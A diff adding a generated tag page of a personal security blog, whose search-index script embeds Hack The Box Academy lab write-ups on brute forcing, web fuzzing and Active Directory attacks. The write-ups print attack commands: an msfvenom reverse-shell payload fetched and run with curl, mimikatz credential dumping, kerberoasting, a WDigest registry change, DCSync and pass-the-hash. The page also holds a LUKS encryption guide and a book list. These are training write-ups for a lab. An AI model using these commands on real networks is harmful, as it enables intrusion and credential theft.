@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+
+    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />
+
+    <meta name="description" content="Htb">
+
+    <link rel="alternate" type="application/rss+xml" href="http://localhost:1313/tags/htb/index.xml" title="Vamsi200 Blog" />
+    
+        <title>Htb | Vamsi200 Blog</title>
+    
+
+    
+    <style>
+        :root {
+          --background: #ffffff;
+        }
+        @media (prefers-color-scheme: dark) {
+          :root {
+            --background: #1b1b1b;
+          }
+        }
+        html {
+            background-color: var(--background);
+        }
+        body {
+            background-color: var(--background);
+        }
+    </style>
+
+    
+    <link rel="stylesheet" type="text/css" href="/style.min.375e5ed55aac1492efe66cf6fd686d0af88cb56b12d6bafab6571d3b39c73883.css" media="all">
+  </head>
+
+  <body>
+        
+        <nav>
+          <ul class="menu">
+            
+                <li><a tabindex="-1" class="menu-link" href="/">Home</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/about/">About</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/tags">Tags</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/books/">Book Recommendations</a></li>
+            
+          </ul>
+        </nav>
+        
+
+
+<h1>Htb</h1>
+<ul class="post-list">
+    
+
+    <li>
+
+    <div style="display: grid; grid-template-columns: 7em auto">
+      <span class="date">Feb 24, 2025</span>
+      
+      <a href="/posts/skills-assessment---web-fuzzing/">Skills Assessment   Web Fuzzing</a>
+      
+    </div>
+
+</li>
+
+
+
+    
+
+    <li>
+
+    <div style="display: grid; grid-template-columns: 7em auto">
+      <span class="date">Feb 20, 2025</span>
+      
+      <a href="/posts/skills-assessment---using-web-proxies/">Skills Assessment Using Web Proxies</a>
+      
+    </div>
+
+</li>
+
+
+
+    
+
+    <li>
+
+    <div style="display: grid; grid-template-columns: 7em auto">
+      <span class="date">Feb 19, 2025</span>
+      
+      <a href="/posts/ad_enumeration__attacks_-_skills_assessment_part_ii/">AD Enumeration &amp; Attacks Skills Assessment Part II</a>
+      
+    </div>
+
+</li>
+
+
+
+    
+
+    <li>
+
+    <div style="display: grid; grid-template-columns: 7em auto">
+      <span class="date">Feb 15, 2025</span>
+      
+      <a href="/posts/ad_enumeration__attacks_-_skills_assessment_part_i/">AD Enumeration &amp; Attacks Skills Assessment Part I</a>
+      
+    </div>
+
+</li>
+
+
+
+    
+
+    <li>
+
+    <div style="display: grid; grid-template-columns: 7em auto">
+      <span class="date">Jan 21, 2025</span>
+      
+      <a href="/posts/pivotingtunnelingand_portforwarding-skill_assessment/">Pivoting, Tunneling, and Port Forwarding - Skill Assessment</a>
+      
+    </div>
+
+</li>
+
+
+
+    
+  </ul>
+
+
+<br>
+
+<footer>
+
+<script defer>
+  document.addEventListener("keydown", function (e) {
+    if (document.activeElement.isContentEditable) {
+      return false;
+    }
+    if (document.activeElement.tagName == "INPUT") {
+      return false;
+    }
+    if (e.altKey || e.ctrlKey || e.shiftKey) {
+      return false;
+    }
+    var key = e.key;
+    if (key === "h") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = "/";
+    } else if (key === "t") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = `https://${location.hostname}/tags`;
+    } else if (key === "i") {
+      e.preventDefault();
+      e.stopPropagation();
+      const inputs = document.querySelectorAll("input");
+      for (let i = 0; i < inputs.length; i++) {
+        if (inputs[i].offsetParent !== null) {
+          inputs[i].selectionStart = inputs[i].selectionEnd =
+            inputs[i].value.length;
+          inputs[i].focus();
+          break;
+        }
+      }
+    }
+    return false;
+  });
+</script>
+
+
+<script defer>
+  function throttle(fn, wait) {
+    var time = Date.now();
+    return function () {
+      var now = Date.now()
+      if (time + wait - now < 0) {
+        fn();
+        time = now;
+      }
+    };
+  }
+
+  function scrollHandler() {
+    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));
+
+    function scrollCallback() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+
+      
+      for (var i = 0; i < anchors.length; i++) {
+        var anchorId = anchors[i].getAttribute("id");
+        var link = document.querySelector(
+          'nav ul li a[href="#' + anchorId + '"]',
+        );
+        if (link) {
+          link.classList.remove("active-toc");
+        }
+      }
+
+      
+      for (var i = anchors.length - 1; i >= 0; i--) {
+        var offsetTop = anchors[i].offsetTop;
+        if (scrollTop > offsetTop - 75) {
+          var anchorId = anchors[i].getAttribute("id");
+          var link = document.querySelector(
+            'nav ul li a[href="#' + anchorId + '"]',
+          );
+          if (link) {
+            link.classList.add("active-toc");
+            break;
+          }
+        }
+      }
+    }
+
+    window.addEventListener(
+      "scroll",
+      throttle(scrollCallback, 200),
+    );
+  }
+  setTimeout(scrollHandler, 100);
+</script>
+
+<script defer>
+  function addCopyButtonToCodeBlocks() {
+    
+    const codeBlocks = document.querySelectorAll('code[class^="language-"]');
+
+    codeBlocks.forEach((codeBlock) => {
+      const copyButton = document.createElement("button");
+      copyButton.classList.add("copy-code-button");
+      copyButton.innerHTML = "copy";
+
+      
+      copyButton.addEventListener("click", () => {
+        
+        const elements = codeBlock.querySelectorAll(".cl");
+        let codeToCopy = "";
+        elements.forEach((element) => {
+          codeToCopy += element.innerText;
+        });
+        navigator.clipboard.writeText(codeToCopy);
+
+        
+        copyButton.innerHTML = "copied!";
+        setTimeout(() => {
+          copyButton.innerHTML = "copy";
+        }, 1500);
+      });
+
+      
+      codeBlock.parentNode.before(copyButton);
+    });
+  }
+  setTimeout(function () {
+    addCopyButtonToCodeBlocks();
+  }, 100);
+</script>
+
+<script>
+window.store = {
+    
+    "http:\/\/localhost:1313\/posts\/": {
+        "title": "Posts",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/posts\/"
+    },
+    
+    "http:\/\/localhost:1313\/posts\/skills-assessment1and2-login-brute-forcing\/": {
+        "title": "Skills Assessment 1\u00262 Login Brute Forcing",
+        "tags": [],
+        "content": "Question 1 - What is the password for the basic auth login? We were given the username \u0026amp; password wordlists, so let\u0026rsquo;s use them: hydra -L \u0026lt;username wordlist\u0026gt; -P \u0026lt;password wordlist\u0026gt; \u0026lt;ip\u0026gt; http-get / -s \u0026lt;port\u0026gt; Question 2 - After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment? When we login using the credentials that we found we find the username: Skills Assessment Part 2 Question 1 - What is the username of the ftp user you find via brute-forcing? we know the username, I ran a nmap scan and found ssh running.. so let\u0026rsquo;s crack it with the given wordlist.\nmedusa -h \u0026lt;ip\u0026gt; -n \u0026lt;port\u0026gt; -u \u0026lt;username\u0026gt; -P \u0026lt;wordlist\u0026gt; -M ssh -t 3 Running that we get the password. Login with the credentials. Don\u0026rsquo;t forget the port\nssh username@\u0026lt;IP\u0026gt; -p \u0026lt;port\u0026gt; We have some files, When we cat the IncidentReport.txt we get to know about a user: Th****. So yeah that\u0026rsquo;s the user.\nQuestion 2 - What is the flag contained within flag.txt Now that we have a username, we also are provided with the password wordlist to crack ftp.. When we run medusa with the username, I didn\u0026rsquo;t find any password match.. and then the username to th****(small case) and found the password. Let\u0026rsquo;s login and get our flag. And yep, that\u0026rsquo;s it. ", 
+        "url": "http:\/\/localhost:1313\/posts\/skills-assessment1and2-login-brute-forcing\/"
+    },
+    
+    "http:\/\/localhost:1313\/": {
+        "title": "Vamsi200 Blog",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/cybersec\/": {
+        "title": "Cybersec",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/cybersec\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/htb\/": {
+        "title": "Htb",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/htb\/"
+    },
+    
+    "http:\/\/localhost:1313\/posts\/skills-assessment---web-fuzzing\/": {
+        "title": "Skills Assessment   Web Fuzzing",
+        "tags": ["htb","cybersec",],
+        "content": "Question 1 - Run a sub-domain/vhost fuzzing scan on \u0026lsquo;*.academy.htb\u0026rsquo; for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name) Well this is straight forward, let\u0026rsquo;s use subdomains-top1million-5000. Don\u0026rsquo;t forget to add ip in your hosts file. ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:\u0026lt;port\u0026gt;/ -H \u0026#39;Host: FUZZ.academy.htb\u0026#39; Question 2 - Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains? Okay, Let\u0026rsquo;s use web-extensions.txt wordlist, pretty straight-forward. I tried fuzzing on 3 different vhosts that we found, and we got our answer. ffuf -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:43252/indexFUZZ Question 3 - One of the pages you will identify should say \u0026lsquo;You don\u0026rsquo;t have access!\u0026rsquo;. What is the full page URL? We have to fuzz on all of our vhosts with recursion and the extensions that we just found.\nI just checked the hint :)\nAlso with 1000 threads.. :?\nffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FUZZ -u http://vhost.academy.htb:PORT/FUZZ -recursion -recursion-depth 1 -e .ext1,.ext2,.ext3 -v -fs \u0026lt;xxx\u0026gt; -t 1000 Question 4 - In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they? Well, we should find the parameters first.. so.. burp-parameter-names.txt\nI got the answer, and gave it as answer.. it\u0026rsquo;s wrong.. because I didn\u0026rsquo;t read the question properly.. question is expecting more parameters..\nso:\nffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u \u0026#39;\u0026lt;url\u0026gt;\u0026#39; -X POST -d \u0026#39;FUZZ=key\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -fs xxx Question 5 - Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag? First we have to find valid usernames..\nI tried different wordlists and finally got the answer with xato-net-10-million-usernames.txt wordlist.\nffuf -w /opt/SecLists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u \u0026#39;\u0026lt;url\u0026gt;\u0026#39; -X POST -d \u0026#39;username=FUZZ\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -fs 781 -t 500 Now, that we have our usernames.. let\u0026rsquo;s just curl it!!\ncurl \u0026lt;url\u0026gt; -X POST -d \u0026#39;username=\u0026lt;user\u0026gt;\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; Andd we got the flag :)\n", 
+        "url": "http:\/\/localhost:1313\/posts\/skills-assessment---web-fuzzing\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/"
+    },
+    
+    "http:\/\/localhost:1313\/posts\/skills-assessment---using-web-proxies\/": {
+        "title": "Skills Assessment Using Web Proxies",
+        "tags": ["htb","cybersec",],
+        "content": "Question 1 - The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag. First make sure to enable Intercept responses and make it to POST request. Now Forward the request. In Response tab, remove the disabled and forward it (Going back to your browser, you can click on button which reveals the flag, don\u0026rsquo;t forget to turn Intercept off) or send it to repeater tab and click on send, which would reveal the flag. Question 2 - The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer. Hitting /admin.php, we get the cookie. Which then can be sent to Decoder: cookie -\u0026gt; decode as ASCII Hex -\u0026gt; reveals base64 -\u0026gt; decode as base64 -\u0026gt; flag(31 chars value) Question 3 - Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the \u0026ldquo;alphanum-case.txt\u0026rdquo; wordlist from Seclist for the payload) Using Intruder, In Payload Processing, we first add our 31 chars value as prefix and Add Base64-encode, ASCII Hex encode. Now Let\u0026rsquo;s Load the alphanum-case.txt file. And start attack. We can one of the request\u0026rsquo;s responses to get the flag. Question 4 - You are using the \u0026lsquo;auxiliary/scanner/http/coldfusion_locale_traversal\u0026rsquo; tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the \u0026lsquo;XXXXX\u0026rsquo; directory being called in \u0026lsquo;/XXXXX/administrator/..\u0026rsquo;? Using Metasploit with auxiliary/scanner/http/coldfusion_locale_traversal\nuse auxiliary/scanner/http/coldfusion_locale_traversal set PROXIES HTTP:127.0.0.1:8080 set RHOSTS \u0026lt;ip\u0026gt; set RPORT \u0026lt;port\u0026gt; Running it and checking it in burp we get the answer. ", 
+        "url": "http:\/\/localhost:1313\/posts\/skills-assessment---using-web-proxies\/"
+    },
+    
+    "http:\/\/localhost:1313\/posts\/ad_enumeration__attacks_-_skills_assessment_part_ii\/": {
+        "title": "AD Enumeration \u0026 Attacks Skills Assessment Part II",
+        "tags": ["htb","cybersec",],
+        "content": "Question 1 - Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name? When I first read the Question, my first thought was LLMNR/NBT-NS Poisoning, because of the title that we have in HTB modules(foothold) :), so I ran responder \u0026amp; got the user and hash : sudo responder -I ens224 Question 2 - What is this user\u0026rsquo;s cleartext password? Cracking the hash with hashcat, we got the password. Question 3 - Submit the contents of the C:\\flag.txt file on MS01. We need to first find the IP of MS01, let\u0026rsquo;s first run fping to get all the Ip\u0026rsquo;s that are active. fping -asgq 172.16.7.0/23 I ran a nmap scan on the Targets and found 172.16.7.50 is MS01, so I initially ran crackmapexec to check if our credentials that we just found are useful. We can use winrm to login and get the flag Question 4 \u0026amp; 5 - Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain \u0026amp; What is this user\u0026rsquo;s password? I wanted to use login using xfreerdp, so that I can easily transfer tools.. I used ssh tunneling to achieve that : ssh -D 9050 \u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt; change/add the proxychains config to use socks4\nI used PowerView to get the no.of users(I didn\u0026rsquo;t just come to conclusion of using PowerView here, I used crackmapexec to get the same..I just wanted to show the count of the users that we are working with..and the reason why I used DomainPasswordSpray tool further): Import-Module .\\PowerView.ps1 Get-NetUser | Select-Object -ExpandProperty SamAccountName | Measure-Object It\u0026rsquo;s a good idea to use DomainPasswordSpray, I tried common passwords and found the username and password : Question 6 - Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? We can use smbmap to get the permissions of shares and found the file in Department Shares Question 7 - Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host. We can use mssqlclient and the credentials that we just found to login. And we find that SeImpersonatePrivilege enabled. This is significant because it allows us to impersonate other users on the system, including the SYSTEM account, which we can then use to execute commands with elevated privileges. We can exploit this. For ease of use, Let\u0026rsquo;s use Metasploit.\nuse exploit/windows/mssql/mssql_payload set LHOST 172.16.7.240 set RHOSTS 172.16.7.60 set USERNAME \u0026lt;user\u0026gt; set PASSWORD \u0026lt;password\u0026gt; We can use getsytem and get the flag. Question 8 - Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host. I tried different methods and came down to using mimikatz, so firstly let\u0026rsquo;s upload mimikatz. I ran mimikatz and got the mssqlsvc password: privilege::debug sekurlsa::logonpasswords I used these credentials and logged in using xfreerdp and used mimikatz to dump the Administrator hash: proxychains xfreerdp /v:\u0026#39;172.16.7.50\u0026#39; /u:\u0026#34;inlanefreight.local\\\u0026lt;username\u0026gt;\u0026#34; /p:\u0026#39;\u0026lt;password\u0026gt;\u0026#39; /cert:ignore /drive:Shared,/opt/test Now that we have the hash, we can pass the hash with evil-winrm and login as Administrator and get the flag. evil-winrm -i \u0026lt;ip\u0026gt; -u Administrator -H \u0026lt;hash\u0026gt; Question 9 - Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What\u0026rsquo;s this user\u0026rsquo;s account name? To achieve this we can use PowerView : Import-Module .\\PowerView.ps1 Get-DomainObjectAcl -Identity \u0026#34;CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local\u0026#34; | Where-Object { $_.ActiveDirectoryRights -like \u0026#34;*GenericAll*\u0026#34;} ConvertFrom-SID \u0026lt;sid\u0026gt; Question 10 - Crack this user\u0026rsquo;s password hash and submit the cleartext password as your answer. I checked previous question\u0026rsquo;s Hint and it was talking about our initial foothold that we did, which was LLMNR/NBT-NS Poisoning, so I ran Inveigh.exe and got the hash :) We can use hashcat to crack this: hashcat -m 5600 \u0026lt;file\u0026gt; Question 11 - Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host. This took some time and I got little frustrated and next day I realized that GenericAll gives the ability to add or remove members. So.. used runas to login with user CT***, next added our user to domain admins.\nCreated a cred object and got the flag.\nrunas /netonly /user:\u0026lt;user\u0026gt; powershell.exe Net group \u0026#34;domain admins\u0026#34; \u0026lt;username\u0026gt; /add /domain $cred = New-Object System.Management.Automation.PSCredential(\u0026#34;INLANEFREIGHT\\\u0026lt;username\u0026gt;\u0026#34;, (ConvertTo-SecureString \u0026#34;\u0026lt;password\u0026gt;\u0026#34; -AsPlainText -Force)) Enter-PSSession -ComputerName DC01 -Credential $cred Question 12 - Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. For this I just copied mimikatz and got the hash Note: This is not a straight process. Like I just know to do these things, It\u0026rsquo;s a mix of Reconnaissance, trail and error and more..\n", 
+        "url": "http:\/\/localhost:1313\/posts\/ad_enumeration__attacks_-_skills_assessment_part_ii\/"
+    },
+    
+    "http:\/\/localhost:1313\/posts\/ad_enumeration__attacks_-_skills_assessment_part_i\/": {
+        "title": "AD Enumeration \u0026 Attacks Skills Assessment Part I",
+        "tags": ["htb","cybersec",],
+        "content": "Initial Access Reconnaissance Given the Scenario, we get the user admin and the password My_W3bsH3ll_*********, so we login with the credentials:\nQuestion 1 - Submit the contents of the flag.txt file on the administrator Desktop of the web server Well, seems that we can access the contents of the Administrator Desktop, so I just grabbed the flag type C:\\Users\\Administrator\\Desktop\\flag.txt Reverse Shell Using Metasploit Payload Generation msfvenom -p windows/x64/meterpreter/reverse_https lhost=\u0026lt;attacker_ip\u0026gt; -f exe -o payload.exe lport=4444 Metasploit Listener Configuration use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set LHOST 10.10.15.161 set LPORT 4444 Payload Delivery And Execution python3 -m http.server using curl to download and executing the payload curl 10.10.15.161:8000/payload.exe -o payload.exe ./payload.exe Got the Shell Question 2 - Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer Enumerating SPNs with setspn.exe1 setspn.exe -Q */* We got our answer that is - s*****l Question 3 - Crack the account\u0026rsquo;s password. Submit the cleartext value. To get the password we can use PowerView, We can use same method, by running a python server and curl it : Now to import the file we run : Import-Module .\\PowerView.ps1 Now that we have it imported, we run to the get the SPN Ticket 2: Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat Nice! we got the hash, lets crack it using Hashcat, which gives us the password lu***7: hashcat -m 13100 svc_sql_hash /usr/share/wordlists/rockyou.txt Question 4 - Submit the contents of the flag.txt file on the Administrator desktop on MS01 Before we proceed, Let\u0026rsquo;s first get the IP of MS01 by pinging it.. which reveals - 172.16.6.** Let\u0026rsquo;s try to login to MS01 with the credentials we found, to do that we run3:\n$password = ConvertTo-SecureString \u0026#34;\u0026lt;password\u0026gt;\u0026#34; -AsPlainText -Force $cred = new-object System.Management.Automation.PSCredential (\u0026#34;INLANEFREIGHT\\svc_sql\u0026#34;, $password) Enter-PSSession -ComputerName MS01-INLANEFREIGHT.LOCAL -Credential $cred It worked! but when I try to get the flag it didn\u0026rsquo;t work, now we have to find a workaround to get a proper Shell, so that we can retreive the flag, One way is that we can start a Socks Proxy using Metasploit, I tried it but was not working.. so I used chisel.exe to do it.\nI downloaded it using curl and ran it.\nchange/add the proxychains config to use socks5\nOn Attack Machine(Linux):\nchisel server -p 9088 --reverse On Target Machine(Windows):\n./chisel.exe client \u0026#39;Attack-IP:9088\u0026#39; R:socks Now using impacket-pssexec we can get the flag:\nproxychains impacket-psexec INLANEFREIGHT.LOCAL/\u0026lt;user\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;Target\u0026gt; Question 5 - Find cleartext credentials for another domain user. Submit the username as your answer. I ran a nmap scan to find that we have rdp open, so I logged in using xfreerdp, also I found out that we can connect to a FreeRDP server with a shared directory4, so I shared it with all the tools that we may need. proxychains xfreerdp /v:\u0026#39;172.16.6.**:3389\u0026#39; /u:\u0026#34;inlanefreight\\\u0026lt;user\u0026gt;\u0026#34; /p:\u0026#39;\u0026lt;password\u0026gt;\u0026#39; /drive:Shared,/opt/test I first ran Inveigh to find anything interesting, but nothing.. So, I went with mimikatz and ran:\nprivilege::debug sekurlsa::logonpasswords we get this user t***** on Domain DC01 which is the answer, Moving on to next question.. Question 6 - Submit this user\u0026rsquo;s cleartext password. We did get the user, but the password is shown as none as you see from the above image, to get the password we have to force WDigest to store credentials in plaintext. We have to modify below registry to achieve that, and we have to reboot, so that we get the cleartext password5 :\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 After restarting we get the cleartext password : Question 7 - What attack can this user perform? I was thinking what could be attack and just casually gave DCsync as an answer and it was correct.. Now we have to find why? for that we can use PowerView6\nImport-Module .\\PowerView.ps1 Get-DomainUser -Identity \u0026lt;user\u0026gt; |select samaccountname,objectsid,memberof,useraccountcontrol | fl $sid = \u0026#34;S-1...\u0026#34; Get-ObjectAcl \u0026#34;DC=inlanefreight,DC=local\u0026#34; -ResolveGUIDs | ? { ($_.ObjectAceType -match \u0026#39;Replication-Get\u0026#39;)} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl As from the above image we can see that DS-Replication-Get-Changes-In-Filtered-Set, DS-Replication-Get-Changes, DS-Replication-Get-Changes-All are present, which allows user to access replication data from AD database. Thus allowing us to perform DCsync attack. Question 8 - Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01 We can use Runas to login as t***** user, now let\u0026rsquo;s just dump the hashes of Administrator using impacket-secretsdump, we can get DC01 IP, by pinging it like we did it before:\nproxychains impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/\u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt; Now that we got the hash, we can pass the hash using crackmapexec and get the final flag!!\nproxychains crackmapexec smb \u0026lt;ip\u0026gt; -u Administrator -H \u0026lt;hash\u0026gt; -x \u0026#39;type C:\\Users\\Administrator\\Desktop\\flag.txt\u0026#39; Kerberoasting - from Windows \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nUsing PowerView to Target a Specific User \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nEstablishing WinRM Session from Windows \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nConnect to a FreeRDP server with a shared directory \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nForcing WDigest to Store Credentials in Plaintext \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nUsing Get-DomainUser to View a User Group Membership \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n", 
+        "url": "http:\/\/localhost:1313\/posts\/ad_enumeration__attacks_-_skills_assessment_part_i\/"
+    },
+    
+    "http:\/\/localhost:1313\/books\/": {
+        "title": "Book Recommendations",
+        "tags": [],
+        "content": " Practical Malware Analysis Cybersecurity\nA hands-on approach to dissecting malware, using real-world examples.\nStatus: In Progress\nRE4B-EN: Reverse Engineering for Beginners Reverse Engineering\nA beginner-friendly guide to reverse engineering with practical exercises.\nStatus: In Progress\nRTFM: Red Team Field Manual v3 Cybersecurity\nA concise manual for Red Team operations, with tools and techniques used in various engagements.\nStatus: Read\nAttacking Network Protocols Network Security\nA comprehensive guide to exploiting network protocol vulnerabilities and understanding countermeasures.\nStatus: In Progress\nHow Linux Works: What Every Superuser Should Know Linux / System Administration\nA deep dive into Linux internals and troubleshooting system issues.\nStatus: In Progress\nMastering Regular Expressions Programming\nA guide to understanding and using regular expressions in programming languages.\nStatus: In Progress\nThe Art and Craft of Problem Solving Mathematics / Problem Solving\nA range of problem-solving techniques and strategies for competitive programming and critical thinking.\nStatus: In Progress\nWhat Every Programmer Should Know About Memory Programming / Computer Architecture\nIn Progress\nStatus: In Progress\nAsamardhuni Jeevayatra Telugu Literature\nA classic Telugu work exploring life’s journey through philosophical reflections.\nStatus: Read\nThe Problem of Pain Philosophy / Theology\nAn exploration of suffering and its role in human existence.\nStatus: In Progress\nYou Are Not So Smart Psychology\nA look at cognitive biases and how they affect our decisions.\nStatus: In Progress\nCrime and Punishment Literature\nA psychological exploration of guilt and redemption.\nStatus: In Progress\nQuantum Mechanics: The Theoretical Minimum Science / Physics\nAn accessible introduction to quantum mechanics.\nStatus: In Progress\nThe Brothers Karamazov Literature / Philosophy\nA profound exploration of morality, faith, and family.\nStatus: In Progress\nBeyond Good and Evil Philosophy\nNietzsche’s provocative exploration of morality and individual power.\nStatus: In Progress\nMeditations Philosophy / Stoicism\nTimeless wisdom on leadership, self-discipline, and resilience from Marcus Aurelius.\nStatus: Read\nPlato: Five Dialogues Philosophy\nA compilation of Plato’s influential dialogues covering justice, virtue, and knowledge.\nStatus: In Progress\nWhite Nights Literature\nA short story exploring loneliness, love, and fleeting moments of connection.\nStatus: Read\nWhat Is It Like to Be a Quark? Science / Physics\nAn exploration of the subatomic world and the nature of quarks and elementary particles.\nStatus: In Progress\nFooled by Randomness Philosophy / Economics\nAn examination of randomness and its role in success and failure.\nStatus: In Progress\n", 
+        "url": "http:\/\/localhost:1313\/books\/"
+    },
+    
+    "http:\/\/localhost:1313\/about\/": {
+        "title": "About Me",
+        "tags": [],
+        "content": "VAMSI(1) \u0026ndash; USER MANUAL NAME Vamsi \u0026ndash; Software Engineer | Security Enthusiast\nSYNOPSIS vamsi [ --code ] [ --infrastructure ] [ --security ]\nDESCRIPTION Vamsi is a software engineer with a passion for building robust systems and exploring the world of cybersecurity. Enjoys tackling complex problems and learning new technologies.\nOPTIONS --languages 💻\nPython, Rust, C, Bash, SQL --infrastructure ⚙️\nKafka, Kubernetes, Docker, Git --security 🛡️\nLinux Hardening, Network Security, CTFs --currently-exploring 🔭\nNetwork Programming, History, Philosophy Malware Analysis, Red Teaming, Emerging Cybersec Areas --contact 📧\nEmail: contact.vamshi99@gmail.com SEE ALSO GitHub Profile 🔗 ", 
+        "url": "http:\/\/localhost:1313\/about\/"
+    },
+    
+    "http:\/\/localhost:1313\/posts\/using_cryptsetup_to_encrypt_partitions\/": {
+        "title": "Encrypting Partitions with LUKS using cryptsetup: A Guide",
+        "tags": ["guide",],
+        "content": "Prerequisites Administrative (sudo) privileges A backup of any existing data on the target partition The partition you want to encrypt (in this guide, we\u0026rsquo;ll use /dev/sdb2) Installing cryptsetup Choose the appropriate command for your distribution:\nFor Debian/Ubuntu:\nsudo apt-get install cryptsetup For distributions using pacman:\nsudo pacman -Sy cryptsetup Encryption Process 1. Initialize LUKS Encryption ⚠️ WARNING: Before we proceed, please make sure you have a BACKUP OF THE DATA somewhere.\nInitialize the LUKS encryption on your partition:\ncryptsetup -y -v luksFormat /dev/sdb2 This command will initialize the partition and will prompt for a passphrase. Please make sure you note the passphrase for further use. 2. Open the Encrypted Partition Create a mapping for the encrypted partition:\ncryptsetup luksOpen /dev/sdb2 test Running the following command will prompt for the passphrase you just created. After successful authentication, the encrypted partition will be available at /dev/mapper/test.\n3. Verify the Setup Check the status of your encrypted mapping:\ncryptsetup -v status test To view detailed LUKS header information:\ncryptsetup luksDump /dev/sdb2 4. Secure the Partition Fill the entire encrypted volume with zeros to ensure secure initialization:\npv -tpreb /dev/zero | dd of=/dev/mapper/test bs=128M This step will:\nOverwrites the entire partition with zeros This may take some time depending on the size of your device/partition, so we have used the pv command to monitor the progress. 5. Create a File System Format the encrypted partition with ext4 or any file system:\nmkfs.ext4 /dev/mapper/test 6. Mount and Verify Create a mount point and mount the encrypted partition:\nsudo mkdir /test_device sudo mount /dev/mapper/test /test_device df -H Usage Tips Always keep your passphrase in a secure location\nConsider creating a backup of the LUKS header\nRemember to close the encrypted partition when not in use:\nsudo umount /test_device cryptsetup luksClose test Note: Whenever you see a guide in my blog, they are primarily for my personal documentation, or I am sharing them in hope they might be useful.\n", 
+        "url": "http:\/\/localhost:1313\/posts\/using_cryptsetup_to_encrypt_partitions\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/guide\/": {
+        "title": "Guide",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/guide\/"
+    },
+    
+    "http:\/\/localhost:1313\/posts\/pivotingtunnelingand_portforwarding-skill_assessment\/": {
